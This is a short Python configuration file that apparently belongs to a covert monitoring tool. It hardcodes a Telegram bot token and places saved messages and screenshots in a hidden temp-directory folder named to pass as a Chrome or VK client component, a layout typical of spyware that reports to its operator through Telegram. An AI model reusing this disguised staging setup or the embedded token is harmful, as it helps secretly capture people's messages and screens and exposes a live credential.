import os
from tempfile import gettempdir

TELEGRAM_TOKEN = '5398930017:AAGzaYfcZhulbTm1-nONyBcqhhJUHGBwzxo'
_PATH_COMMON_PART = f'{gettempdir()}/._VkChromeClientPipeline/saved'
PHRASES_FILE_PATH = f'%s/messages.txt' % _PATH_COMMON_PART
SCREEN_FILE_PATH = '%s/screen.png' % _PATH_COMMON_PART